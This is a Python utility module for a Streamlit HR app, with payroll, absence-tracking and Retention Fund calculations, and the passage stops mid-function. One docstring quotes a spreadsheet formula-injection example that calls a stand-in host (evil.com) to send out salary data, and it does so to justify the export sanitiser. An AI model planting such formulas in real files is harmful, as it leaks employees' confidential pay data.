"""
Shared utility functions for the HR Assistant app.
Keeping all business-logic / calculation functions here (instead of inside
each page) makes the app easier to maintain and test.
"""

import io
import os
import json
import re
from datetime import date, datetime
import pandas as pd
import streamlit as st


# --------------------------------------------------------------------------
# Navigation helpers
# --------------------------------------------------------------------------

def hide_default_sidebar_nav():
    """Hides Streamlit's automatic multipage sidebar list, so navigation is
    driven entirely by the nav cards / nav bar we render ourselves."""
    st.markdown(
        """
        <style>
        [data-testid="stSidebarNav"] {display: none;}
        </style>
        """,
        unsafe_allow_html=True,
    )


# NOTE: keep this in sync with the actual files under pages/. Every entry
# here becomes a st.page_link() call in render_top_nav() below - an entry
# pointing at a file that doesn't exist will raise an error, and an active
# page missing from this list simply won't get a nav link.
PAGES = [
    {"path": "pages/0_Login.py", "label": "Login", "icon": "🔐"},
    {"path": "Home.py", "label": "Home", "icon": "🗂️"},
    {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
    {"path": "pages/2_Retention_Fund.py", "label": "Retention Fund", "icon": "💰"},
    {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
    {"path": "pages/4_Employee_Database.py", "label": "Employee Database", "icon": "👥"},
    {"path": "pages/7_Shift_management.py", "label": "Shift Management", "icon": "🕒"},
]


def render_top_nav(active_label: str):
    """Renders a simple horizontal row of page links at the top of a page,
    used instead of the default sidebar navigation list.

    This now also shows a small user status area on the right with a logout
    button when the user is logged in."""
    hide_default_sidebar_nav()
    # extra column at the end reserved for user status / logout
    cols = st.columns(len(PAGES) + 1)
    for col, page in zip(cols[:-1], PAGES):
        with col:
            if page["label"] == active_label:
                st.markdown(f"**{page['icon']} {page['label']}**")
            else:
                st.page_link(page["path"], label=page["label"], icon=page["icon"])

    # right-most column: user status and logout
    with cols[-1]:
        if st.session_state.get("logged_in"):
            user = st.session_state.get("user")
            st.markdown(f"**👤 {user}**")
            if st.button("Logout"):
                # clear login-related session state keys (preserve app data)
                for k in ["logged_in", "user", "role"]:
                    if k in st.session_state:
                        del st.session_state[k]
                st.experimental_rerun()
        else:
            st.markdown("Not logged in")

    st.divider()


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------

def read_any_table(uploaded_file) -> pd.DataFrame:
    """Read an uploaded .csv / .xlsx / .xls file, always treating the first
    row as the header row. Returns a cleaned DataFrame (strips whitespace
    from column names)."""
    if uploaded_file is None:
        return pd.DataFrame()

    name = uploaded_file.name.lower()
    if name.endswith(".csv"):
        df = pd.read_csv(uploaded_file, header=0)
    else:
        df = pd.read_excel(uploaded_file, header=0, engine="openpyxl")

    df.columns = [str(c).strip() for c in df.columns]
    return df


def to_excel_bytes(sheets: dict) -> bytes:
    """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
    and return the raw bytes, ready for st.download_button.

    Every sheet is passed through `sanitize_dataframe_for_export()` first so
    that no exported file can carry a formula-injection payload (a common
    way sensitive data gets silently exfiltrated when a report is later
    re-opened in Excel/Sheets by someone else)."""
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
        for sheet_name, df in sheets.items():
            safe_name = str(sheet_name)[:31]  # Excel sheet name limit
            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
    return buffer.getvalue()


def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: str = None):
    st.download_button(
        label=label,
        data=to_excel_bytes({"Sheet1": df}),
        file_name=file_name,
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        key=key,
    )


# --------------------------------------------------------------------------
# Data-leak / security hardening
# --------------------------------------------------------------------------

_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
    """Neutralizes CSV/Excel formula-injection payloads before any data
    leaves the app as a downloadable file.

    If a cell value (typically from an uploaded sheet) starts with =, +, -,
    or @, Excel/Sheets will treat it as a formula when the exported file is
    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
    can silently exfiltrate adjacent salary data the moment someone opens
    the report. Prefixing such cells with a leading apostrophe forces them
    to render as plain text instead of executing.

    This only rewrites string cells that start with a trigger character —
    numbers, dates, and normal text are left untouched.
    """
    out = df.copy()
    for col in out.columns:
        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
            out[col] = out[col].apply(
                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
            )
    return out


def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
    """Returns a generic, user-facing error message that never echoes raw
    exception text back into the UI. Exception messages can accidentally
    contain fragments of the underlying data (e.g. a bad cell value quoted
    inside a pandas/KeyError message) — showing that verbatim in st.error
    is itself a small data leak. Log `exc` server-side via your own logging
    setup if you need the details; don't display it to end users.
    """
    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."


SENSITIVE_SESSION_KEYS = [
    "employee_db",
    "fulltime_data",
    "payroll_result",
    "gig_data",
    "gig_result",
    "retention_fund_data",
    "retention_result",
    "consolidated_paysheets",
    "consolidated_paysheet_result",
    "consolidated_paysheet_summary",
]


def clear_sensitive_session_data():
    """Wipes all cached salary/employee data out of session_state. Streamlit
    keeps session_state in server memory for as long as the browser tab's
    session is alive — calling this lets you deliberately purge sensitive
    payroll data once you're done with it, rather than leaving it sitting
    in memory (e.g. on a shared workstation)."""
    for key in SENSITIVE_SESSION_KEYS:
        if key in st.session_state:
            del st.session_state[key]


def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
    if st.button(label):
        clear_sensitive_session_data()
        st.success("Session data cleared.")
        st.rerun()


# --------------------------------------------------------------------------
# 1. Long Absence Tracking
# --------------------------------------------------------------------------

def sample_attendance_muster() -> pd.DataFrame:
    """Small example attendance muster for download, showing the expected
    shape: employee identifier columns first (Employee ID, Employee Name,
    Branch), followed by one column per day with attendance marks
    (P=Present, A=Absent, WO=Weekly Off, L=Leave).

    This mirrors the row/column layout the Long Absence Tracker page
    expects — copy this shape when preparing your real muster."""
    days = [f"Day{i}" for i in range(1, 11)]

    rows = [
        {
            "Employee ID": "E001",
            "Employee Name": "Ravi Kumar",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "A", "P", "P", "WO", "P", "A", "P", "P"])),
        },
        {
            "Employee ID": "E002",
            "Employee Name": "Sita Sharma",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "P", "P", "P", "WO", "P", "P", "P", "P"])),
        },
        {
            "Employee ID": "E003",
            "Employee Name": "Mohan Das",
            "Branch": "Whitefield",
            **dict(zip(days, ["A", "A", "A", "A", "A", "WO", "A", "A", "A", "A"])),
        },
    ]
    return pd.DataFrame(rows)


def count_absences(df: pd.DataFrame, id_cols: list, absence_marker: str = "A") -> pd.DataFrame:
    """Given an attendance muster where `id_cols` identify the employee and
    all other columns are day-wise attendance marks, count how many times
    `absence_marker` (default 'A') appears for each employee."""
    day_cols = [c for c in df.columns if c not in id_cols]

    def count_row(row):
        vals = row[day_cols].astype(str).str.strip().str.upper()
        return (vals == absence_marker.upper()).sum()

    result = df[id_cols].copy()
    result["Total_Absent_Days"] = df.apply(count_row, axis=1)
    result["Total_Days_In_Muster"] = len(day_cols)
    return result


def categorize_absences(df: pd.DataFrame, thresholds: list) -> pd.DataFrame:
    """thresholds: list of (label, min_days, max_days_or_None) tuples,
    evaluated in order. max_days_or_None means "and above".
    Adds a 'Absence_Category' column to df (based on Total_Absent_Days).
    """

    def classify(days):
        for label, min_d, max_d in thresholds:
            if max_d is None:
                if days >= min_d:
                    return label
            else:
                if min_d <= days <= max_d:
                    return label
        return "Not Flagged"

    out = df.copy()
    out["Absence_Category"] = out["Total_Absent_Days"].apply(classify)
    return out


DEFAULT_ABSENCE_THRESHOLDS = [
    ("Informed Leave (3-4 days)", 3, 4),
    ("To Be Checked (5-20 days)", 5, 20),
    ("Probable Exit Case (>20 days)", 21, None),
]


# --------------------------------------------------------------------------
# 2. Retention Fund — First Hire Date based design
# --------------------------------------------------------------------------
# Business rules implemented here:
#   * No Internal Transfer logic.
#   * First Hire Date (not Joining Date) controls the first deduction month.
#   * Deduction starts in the First Hire Date calendar month.
#   * Deduction = min(10% of Monthly Gross, Net Pay).
#   * Customize Dashboard is a rule table keyed by Branch + Company Code +
#     Designation. Employment Type and Retention Applicable are dropdowns.
#   * Exceptional ERPs are hard exclusions and override every other rule.
#   * Monthly paysheets can be processed together and reported in a single
#     consolidated output.

_APP_ROOT = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR = os.path.join(_APP_ROOT, "..", "data")
_EXCEPTIONAL_ERP_FILE = os.path.join(_DATA_DIR, "exceptional_erps.json")
_CUSTOMIZE_DASHBOARD_FILE = os.path.join(_DATA_DIR, "customize_dashboard.json")

EMPLOYMENT_TYPE_OPTIONS = ["Full Time", "Contractual", "Part Time"]
RETENTION_APPLICABLE_OPTIONS = ["Yes", "No"]

CUSTOMIZE_KEY_COLUMNS = ["Branch", "Company Code", "Designation"]
CUSTOMIZE_DASHBOARD_COLUMNS = [
    "Branch",
    "Designation",
    "Employment Type",
    "Company Code",
    "Retention Applicable",
]

CONSOLIDATED_PAYSHEET_COLUMNS = ["ERP", "First Hire Date", "Net Pay", "Monthly Gross"]
EMPLOYEE_MASTER_COLUMNS = ["ERP", "Branch", "Designation", "Company Code"]


def _clean_text(value) -> str:
    if value is None or (isinstance(value, float) and pd.isna(value)):
        return ""
    return str(value).strip()


def _normalise_key_series(series: pd.Series) -> pd.Series:
    return series.fillna("").astype(str).str.strip().str.upper()


def load_exceptional_erps() -> list:
    """Load ERPs that must never have Retention Fund deducted."""
    if not os.path.exists(_EXCEPTIONAL_ERP_FILE):
        return []
    try:
        with open(_EXCEPTIONAL_ERP_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return sorted({_clean_text(v).upper() for v in data if _clean_text(v)})
    except Exception:
        pass
    return []


def save_exceptional_erps(erps: list):
    """Persist the exceptional ERP list."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({_clean_text(v).upper() for v in erps if _clean_text(v)})
    with open(_EXCEPTIONAL_ERP_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


def load_customize_dashboard() -> pd.DataFrame:
    """Load Branch + Company Code + Designation retention rules.

    Older saved files may contain ERP because the previous design stored one
    rule per employee. ERP is intentionally discarded during migration and
    duplicate rule keys are collapsed using the last saved row.
    """
    if not os.path.exists(_CUSTOMIZE_DASHBOARD_FILE):
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    try:
        with open(_CUSTOMIZE_DASHBOARD_FILE, "r", encoding="utf-8") as f:
            records = json.load(f)
        df = pd.DataFrame(records)
        for col in CUSTOMIZE_DASHBOARD_COLUMNS:
            if col not in df.columns:
                df[col] = None
        df = df[CUSTOMIZE_DASHBOARD_COLUMNS].copy()
        return _prepare_customize_dashboard(df)
    except Exception:
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)


def _prepare_customize_dashboard(df: pd.DataFrame) -> pd.DataFrame:
    out = df.copy()
    for col in CUSTOMIZE_DASHBOARD_COLUMNS:
        if col not in out.columns:
            out[col] = None

    for col in ["Branch", "Designation", "Company Code"]:
        out[col] = out[col].apply(_clean_text)

    out["Employment Type"] = out["Employment Type"].apply(_clean_text).replace("", "Full Time")
    out["Retention Applicable"] = out["Retention Applicable"].apply(_clean_text).replace("", "Yes")

    # Keep only supported dropdown values; unknown legacy values become the
    # safe defaults so the user can correct them in the dashboard.
    out.loc[~out["Employment Type"].isin(EMPLOYMENT_TYPE_OPTIONS), "Employment Type"] = "Full Time"
    out.loc[~out["Retention Applicable"].isin(RETENTION_APPLICABLE_OPTIONS), "Retention Applicable"] = "Yes"

    # A rule without all three key fields cannot be matched reliably.
    valid = (
        out["Branch"].ne("")
        & out["Company Code"].ne("")
        & out["Designation"].ne("")
    )
    out = out.loc[valid, CUSTOMIZE_DASHBOARD_COLUMNS].copy()

    # Dedupe case-insensitively while retaining display casing from the last row.
    out["__branch_key"] = _normalise_key_series(out["Branch"])
    out["__cc_key"] = _normalise_key_series(out["Company Code"])
    out["__desig_key"] = _normalise_key_series(out["Designation"])
    out = out.drop_duplicates(["__branch_key", "__cc_key", "__desig_key"], keep="last")
    return out.drop(columns=["__branch_key", "__cc_key", "__desig_key"]).reset_index(drop=True)


def save_customize_dashboard(df: pd.DataFrame):
    """Persist Customize Dashboard rules."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    out = _prepare_customize_dashboard(df)
    with open(_CUSTOMIZE_DASHBOARD_FILE, "w", encoding="utf-8") as f:
        json.dump(out.to_dict(orient="records"), f, indent=2, default=str)


def sample_customize_dashboard_bulk_template() -> pd.DataFrame:
    """Template requested for Customize Dashboard bulk upload.

    The upload contains only Branch, Company Code and Designation. The two
    remaining fields appear in the app as dropdowns and default to Full Time
    and Yes for a new rule.
    """
    return pd.DataFrame(
        [
            {"Branch": "Koramangala", "Company Code": "MAIN", "Designation": "Teacher"},
            {"Branch": "Whitefield", "Company Code": "MAIN", "Designation": "Principal"},
        ]
    )


def merge_customize_dashboard_bulk_upload(
    existing_df: pd.DataFrame,
    upload_df: pd.DataFrame,
    erp_col: str = None,  # kept only for backward compatibility; intentionally ignored
    branch_col: str = "Branch",
    cc_col: str = "Company Code",
    designation_col: str = "Designation",
) -> pd.DataFrame:
    """Merge a 3-column Customize Dashboard bulk upload into saved rules.

    Existing Employment Type / Retention Applicable selections are retained
    when the same Branch + Company Code + Designation is uploaded again.
    New rules default to Full Time / Yes and can be changed via dropdowns.
    """
    required = [branch_col, cc_col, designation_col]
    missing = [c for c in required if c not in upload_df.columns]
    if missing:
        raise ValueError(f"Customize upload is missing required column(s): {', '.join(missing)}")

    existing = _prepare_customize_dashboard(existing_df)
    existing_map = {}
    for _, row in existing.iterrows():
        key = (
            _clean_text(row["Branch"]).upper(),
            _clean_text(row["Company Code"]).upper(),
            _clean_text(row["Designation"]).upper(),
        )
        existing_map[key] = row.to_dict()

    rows = []
    for _, row in upload_df.iterrows():
        branch = _clean_text(row.get(branch_col))
        cc = _clean_text(row.get(cc_col))
        desig = _clean_text(row.get(designation_col))
        if not branch or not cc or not desig:
            continue

        key = (branch.upper(), cc.upper(), desig.upper())
        prior = existing_map.get(key, {})
        rows.append(
            {
                "Branch": branch,
                "Designation": desig,
                "Employment Type": prior.get("Employment Type", "Full Time"),
                "Company Code": cc,
                "Retention Applicable": prior.get("Retention Applicable", "Yes"),
            }
        )

    uploaded_rules = pd.DataFrame(rows, columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    if uploaded_rules.empty:
        return existing

    # Replace matching keys and preserve rules not included in this upload.
    old = existing.copy()
    old["__key"] = list(
        zip(
            _normalise_key_series(old["Branch"]),
            _normalise_key_series(old["Company Code"]),
            _normalise_key_series(old["Designation"]),
        )
    )
    uploaded_rules["__key"] = list(
        zip(
            _normalise_key_series(uploaded_rules["Branch"]),
            _normalise_key_series(uploaded_rules["Company Code"]),
            _normalise_key_series(uploaded_rules["Designation"]),
        )
    )
    untouched = old.loc[~old["__key"].isin(set(uploaded_rules["__key"]))].drop(columns="__key")
    uploaded_rules = uploaded_rules.drop(columns="__key")
    return _prepare_customize_dashboard(pd.concat([untouched, uploaded_rules], ignore_index=True))


# --------------------------------------------------------------------------
# Payroll cycle helper — retained for other app modules only.
# Retention Fund itself DOES NOT use joining date / internal transfer cycle.
# --------------------------------------------------------------------------

def get_payroll_cycle(reference_date=None) -> tuple:
    if reference_date is None:
        reference_date = date.today()
    if isinstance(reference_date, datetime):
        reference_date = reference_date.date()

    if reference_date.day >= 26:
        cycle_start = date(reference_date.year, reference_date.month, 26)
        end_month = reference_date.month + 1
        end_year = reference_date.year
        if end_month > 12:
            end_month = 1
            end_year += 1
        cycle_end = date(end_year, end_month, 25)
    else:
        start_month = reference_date.month - 1
        start_year = reference_date.year
        if start_month < 1:
            start_month = 12
            start_year -= 1
        cycle_start = date(start_year, start_month, 26)
        cycle_end = date(reference_date.year, reference_date.month, 25)
    return cycle_start, cycle_end


def format_date_ddmmmyyyy(value) -> str:
    if value is None:
        return ""
    try:
        if isinstance(value, float) and pd.isna(value):
            return ""
        dt_value = pd.to_datetime(value)
        if pd.isna(dt_value):
            return ""
        return dt_value.strftime("%d-%b-%Y")
    except Exception:
        return ""


def pending_deduction_sentence(label: str, pending_df: pd.DataFrame, name_col: str) -> str:
    count = len(pending_df)
    if count == 0:
        return f"**{label}**: No deductions pending."
    if count == 1:
        emp_name = pending_df.iloc[0][name_col] if name_col in pending_df.columns else "employee"
        return f"**{label}**: 1 deduction pending with employee {emp_name}."
    return f"**{label}**: {count} deductions pending."


# --------------------------------------------------------------------------
# Numeric coercion (shared by payroll + retention calculations)
# --------------------------------------------------------------------------

def coerce_numeric_column(series: pd.Series, column_name: str = "value") -> pd.Series:
    if pd.api.types.is_numeric_dtype(series):
        return pd.to_numeric(series, errors="coerce")

    cleaned = series.astype(str).str.replace(r"[₹$,\s]", "", regex=True).str.strip()
    cleaned = cleaned.replace({"": None, "nan": None, "None": None, "NaT": None})
    numeric = pd.to_numeric(cleaned, errors="coerce")

    bad_mask = numeric.isna() & series.notna() & series.astype(str).str.strip().ne("")
    if bad_mask.any():
        bad_rows = series[bad_mask]
        examples = ", ".join(f"row {i + 2}: '{v}'" for i, v in bad_rows.head(5).items())
        more = f" (+{bad_mask.sum() - 5} more)" if bad_mask.sum() > 5 else ""
        raise ValueError(
            f"Column '{column_name}' has {bad_mask.sum()} invalid numeric value(s) — {examples}{more}."
        )
    return numeric


def sample_consolidated_paysheet_template() -> pd.DataFrame:
    """Required sample format for each monthly paysheet."""
    return pd.DataFrame(
        [
            {"ERP": "E001", "First Hire Date": "2020-01-15", "Net Pay": 21000, "Monthly Gross": 25000},
            {"ERP": "E002", "First Hire Date": "2021-06-10", "Net Pay": 31000, "Monthly Gross": 35000},
            {"ERP": "E003", "First Hire Date": "2024-09-20", "Net Pay": 36000, "Monthly Gross": 40000},
        ]
    )


def _resolve_column(df: pd.DataFrame, aliases: list) -> str | None:
    lookup = {str(c).strip().lower(): c for c in df.columns}
    for alias in aliases:
        if alias.lower() in lookup:
            return lookup[alias.lower()]
    return None


def normalise_employee_master(employee_master: pd.DataFrame | None) -> pd.DataFrame:
    """Convert the app's Employee Database into the 4 columns needed to map
    an ERP to the Customize Dashboard rule.
    """
    if employee_master is None or employee_master.empty:
        return pd.DataFrame(columns=EMPLOYEE_MASTER_COLUMNS)

    aliases = {
        "ERP": ["ERP", "Employee ID", "Employee Code", "Emp Code", "EmployeeCode"],
        "Branch": ["Branch", "Current Branch", "Curr.Branch", "Curr Branch", "Location"],
        "Designation": ["Designation", "Current Designation", "Curr.Designation", "Curr Designation"],
        "Company Code": ["Company Code", "CompanyCode", "Comp Code", "Company"],
    }
    resolved = {name: _resolve_column(employee_master, opts) for name, opts in aliases.items()}
    missing = [name for name, source in resolved.items() if source is None]
    if missing:
        return pd.DataFrame(columns=EMPLOYEE_MASTER_COLUMNS)

    out = employee_master[[resolved[c] for c in EMPLOYEE_MASTER_COLUMNS]].copy()
    out.columns = EMPLOYEE_MASTER_COLUMNS
    out["ERP"] = out["ERP"].apply(_clean_text)
    for col in ["Branch", "Designation", "Company Code"]:
        out[col] = out[col].apply(_clean_text)
    out = out[out["ERP"].ne("")]
    return out.drop_duplicates(subset=["ERP"], keep="last").reset_index(drop=True)


def _attach_employee_profile(
    paysheet: pd.DataFrame,
    erp_col: str,
    employee_master: pd.DataFrame | None,
) -> pd.DataFrame:
    out = paysheet.copy()
    out[erp_col] = out[erp_col].apply(_clean_text)

    # If the paysheet already contains these optional fields, keep them.
    required_profile = ["Branch", "Designation", "Company Code"]
    missing_profile = [c for c in required_profile if c not in out.columns]

    master = normalise_employee_master(employee_master)
    if missing_profile and not master.empty:
        master = master.copy()
        master["__erp_key"] = _normalise_key_series(master["ERP"])
        out["__erp_key"] = _normalise_key_series(out[erp_col])
        source = master[["__erp_key"] + missing_profile].drop_duplicates("__erp_key", keep="last")
        out = out.merge(source, on="__erp_key", how="left")
        out = out.drop(columns="__erp_key")

    for col in required_profile:
        if col not in out.columns:
            out[col] = ""
        out[col] = out[col].apply(_clean_text)

    out["Employee Master Mapping Missing"] = (
        out["Branch"].eq("") | out["Designation"].eq("") | out["Company Code"].eq("")
    )
    return out


def _attach_customize_rule(out: pd.DataFrame, customize_dashboard: pd.DataFrame | None) -> pd.DataFrame:
    rules = _prepare_customize_dashboard(
        customize_dashboard if customize_dashboard is not None else pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    )

    out = out.copy()
    out["__branch_key"] = _normalise_key_series(out["Branch"])
    out["__cc_key"] = _normalise_key_series(out["Company Code"])
    out["__desig_key"] = _normalise_key_series(out["Designation"])

    if rules.empty:
        out["Employment Type"] = None
        out["Retention Applicable"] = None
        out["Customize Rule Matched"] = False
        return out.drop(columns=["__branch_key", "__cc_key", "__desig_key"])

    rules = rules.copy()
    rules["__branch_key"] = _normalise_key_series(rules["Branch"])
    rules["__cc_key"] = _normalise_key_series(rules["Company Code"])
    rules["__desig_key"] = _normalise_key_series(rules["Designation"])
    rules["Customize Rule Matched"] = True

    # Only bring the rule outputs; Branch / Designation / Company Code already
    # came from the employee master and remain the reporting attributes.
    rule_cols = [
        "__branch_key",
        "__cc_key",
        "__desig_key",
        "Employment Type",
        "Retention Applicable",
        "Customize Rule Matched",
    ]
    out = out.merge(
        rules[rule_cols],
        on=["__branch_key", "__cc_key", "__desig_key"],
        how="left",
    )
    out["Customize Rule Matched"] = out["Customize Rule Matched"].eq(True)
    return out.drop(columns=["__branch_key", "__cc_key", "__desig_key"])


def compute_paysheet_deduction(
    df: pd.DataFrame,
    erp_col: str,
    first_hire_col: str,
    net_pay_col: str,
    gross_col: str,
    paysheet_month,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    deduction_pct: float = 10.0,
    employee_master: pd.DataFrame = None,
) -> pd.DataFrame:
    """Compute one month's Retention Fund.

    Formula: min(10% of Monthly Gross, Net Pay).

    The First Hire Date *month* controls eligibility. Example: an employee
    first hired on 20-Sep-2026 is eligible for the September 2026 paysheet.
    There is no Joining Date or Internal Transfer logic in this calculation.
    """
    required = [erp_col, first_hire_col, net_pay_col, gross_col]
    missing = [c for c in required if c not in df.columns]
    if missing:
        raise ValueError(f"Paysheet is missing required column(s): {', '.join(missing)}")

    if deduction_pct < 0:
        raise ValueError("Deduction percentage cannot be negative.")

    out = df.copy()
    out[erp_col] = out[erp_col].apply(_clean_text)
    if out[erp_col].eq("").any():
        raise ValueError("ERP cannot be blank in a paysheet.")
    if out[erp_col].str.upper().duplicated().any():
        dupes = out.loc[out[erp_col].str.upper().duplicated(keep=False), erp_col].head(10).tolist()
        raise ValueError(f"Duplicate ERP(s) found in the same paysheet month: {', '.join(map(str, dupes))}")

    out[gross_col] = coerce_numeric_column(out[gross_col], gross_col)
    out[net_pay_col] = coerce_numeric_column(out[net_pay_col], net_pay_col)

    # First Hire Date is the ONLY hire-date basis used for Retention Fund.
    out["First Hire Date"] = pd.to_datetime(out[first_hire_col], errors="coerce")
    out["First Hire Date Valid"] = out["First Hire Date"].notna()

    month_ts = pd.Timestamp(paysheet_month).to_period("M").to_timestamp()
    out["Paysheet Month"] = month_ts
    first_hire_period = out["First Hire Date"].dt.to_period("M")
    out["Hired By This Month"] = (
        out["First Hire Date Valid"] & (first_hire_period <= month_ts.to_period("M"))
    )

    # Hard ERP-level exclusions.
    exceptional_set = {_clean_text(v).upper() for v in (exceptional_erps or []) if _clean_text(v)}
    out["Exceptional ERP"] = out[erp_col].str.upper().isin(exceptional_set)

    # Four-column consolidated paysheet is enriched using Employee Database.
    out = _attach_employee_profile(out, erp_col=erp_col, employee_master=employee_master)
    out = _attach_customize_rule(out, customize_dashboard=customize_dashboard)

    out["Financial Data Valid"] = out[gross_col].notna() & out[net_pay_col].notna()
    out["10% of Gross"] = out[gross_col] * (deduction_pct / 100.0)

    retention_yes = out["Retention Applicable"].fillna("").astype(str).str.strip().str.lower().eq("yes")
    out["Deduction Applicable"] = (
        out["First Hire Date Valid"]
        & out["Hired By This Month"]
        & ~out["Exceptional ERP"]
        & ~out["Employee Master Mapping Missing"]
        & out["Customize Rule Matched"]
        & retention_yes
        & out["Financial Data Valid"]
    )

    out["Deduction Amount"] = 0.0
    if out["Deduction Applicable"].any():
        idx = out["Deduction Applicable"]
        # Exact requested formula. Floor at zero prevents a negative recovery
        # amount from turning into a negative Retention Fund deduction.
        raw = out.loc[idx, ["10% of Gross", net_pay_col]].min(axis=1, skipna=False)
        out.loc[idx, "Deduction Amount"] = raw.clip(lower=0)

    def _status(row):
        if not row["First Hire Date Valid"]:
            return "Invalid First Hire Date"
        if not row["Hired By This Month"]:
            return "Before First Hire Month"
        if row["Exceptional ERP"]:
            return "Exceptional ERP - Excluded"
        if row["Employee Master Mapping Missing"]:
            return "Employee Master Mapping Missing"
        if not row["Customize Rule Matched"]:
            return "Customize Rule Missing"
        if str(row.get("Retention Applicable", "")).strip().lower() != "yes":
            return "Retention Not Applicable"
        if not row["Financial Data Valid"]:
            return "Missing Pay Data"
        if row["Deduction Amount"] <= 0:
            return "No Deduction"
        return "Pending Release"

    out["Status"] = out.apply(_status, axis=1)
    out["First Hire Month"] = out["First Hire Date"].dt.to_period("M").astype("string")
    return out


def process_consolidated_paysheets(
    monthly_inputs: list,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    employee_master: pd.DataFrame = None,
    deduction_pct: float = 10.0,
) -> tuple:
    """Process many months in one run using one canonical First Hire Date.

    `monthly_inputs` accepts dictionaries like:
      {"month": "2026-06", "data": dataframe, "source": "Jun.xlsx"}
    or tuples: (month, dataframe).

    The earliest valid First Hire Date found for an ERP across all uploaded
    monthly paysheets becomes that ERP's canonical First Hire Date. This is
    important because "first hire" must remain stable across months even if
    a later source file contains an inconsistent date. Any inconsistency is
    retained as an audit flag in the output.

    Returns (erp_summary, combined_month_wise_detail).
    """
    prepared = []
    hire_rows = []

    for item in monthly_inputs:
        if isinstance(item, dict):
            month = item.get("month")
            data = item.get("data")
            source = item.get("source", "")
        else:
            month, data = item[0], item[1]
            source = item[2] if len(item) > 2 else ""

        if data is None or data.empty:
            continue

        missing = [c for c in CONSOLIDATED_PAYSHEET_COLUMNS if c not in data.columns]
        if missing:
            raise ValueError(f"{source or 'Paysheet'} is missing required column(s): {', '.join(missing)}")

        work = data.copy()
        work["ERP"] = work["ERP"].apply(_clean_text)
        work["__erp_key"] = work["ERP"].str.upper()
        work["__uploaded_first_hire"] = pd.to_datetime(work["First Hire Date"], errors="coerce")

        hire_rows.append(work[["__erp_key", "__uploaded_first_hire"]].copy())
        prepared.append({"month": month, "data": work, "source": source})

    if not prepared:
        return pd.DataFrame(), pd.DataFrame()

    all_hires = pd.concat(hire_rows, ignore_index=True)
    canonical = (
        all_hires.dropna(subset=["__uploaded_first_hire"])
        .groupby("__erp_key")["__uploaded_first_hire"]
        .min()
    )
    distinct_dates = (
        all_hires.dropna(subset=["__uploaded_first_hire"])
        .groupby("__erp_key")["__uploaded_first_hire"]
        .nunique()
    )
    variance_map = distinct_dates.gt(1).to_dict()

    monthly_results = []
    for item in prepared:
        work = item["data"].copy()
        work["Uploaded First Hire Date"] = work["__uploaded_first_hire"]
        work["First Hire Date"] = work["__erp_key"].map(canonical)
        work["First Hire Date Variance"] = work["__erp_key"].map(variance_map).fillna(False).astype(bool)
        work["First Hire Date Recovered"] = work["__uploaded_first_hire"].isna() & work["First Hire Date"].notna()
        work = work.drop(columns=["__uploaded_first_hire", "__erp_key"])

        result = compute_paysheet_deduction(
            work,
            erp_col="ERP",
            first_hire_col="First Hire Date",
            net_pay_col="Net Pay",
            gross_col="Monthly Gross",
            paysheet_month=item["month"],
            exceptional_erps=exceptional_erps,
            customize_dashboard=customize_dashboard,
            deduction_pct=deduction_pct,
            employee_master=employee_master,
        )
        result["Source File"] = item["source"]
        monthly_results.append(result)

    return consolidate_paysheet_months(monthly_results, erp_col="ERP")

def consolidate_paysheet_months(monthly_results: list, erp_col: str = "ERP") -> tuple:
    """Create one ERP summary plus the full month-wise detail table."""
    if not monthly_results:
        return pd.DataFrame(), pd.DataFrame()

    combined = pd.concat(monthly_results, ignore_index=True)
    combined["Paysheet Month"] = pd.to_datetime(combined["Paysheet Month"]).dt.to_period("M").dt.to_timestamp()

    # Prevent accidental double deduction when the same ERP/month is uploaded twice.
    duplicate_pair = combined.duplicated(subset=[erp_col, "Paysheet Month"], keep=False)
    if duplicate_pair.any():
        examples = combined.loc[duplicate_pair, [erp_col, "Paysheet Month"]].head(10).copy()
        examples["Paysheet Month"] = examples["Paysheet Month"].dt.strftime("%b-%Y")
        pairs = ", ".join(f"{r[erp_col]} ({r['Paysheet Month']})" for _, r in examples.iterrows())
        raise ValueError(f"The same ERP/month was uploaded more than once: {pairs}")

    combined = combined.sort_values([erp_col, "Paysheet Month"]).reset_index(drop=True)

    if "First Hire Date Variance" not in combined.columns:
        combined["First Hire Date Variance"] = False
    if "First Hire Date Recovered" not in combined.columns:
        combined["First Hire Date Recovered"] = False

    summary = combined.groupby(erp_col, dropna=False).agg(
        **{
            "First Hire Date": ("First Hire Date", "min"),
            "First Hire Date Variance": ("First Hire Date Variance", "max"),
            "First Hire Date Recovered": ("First Hire Date Recovered", "max"),
            "Branch": ("Branch", "last"),
            "Designation": ("Designation", "last"),
            "Employment Type": ("Employment Type", "last"),
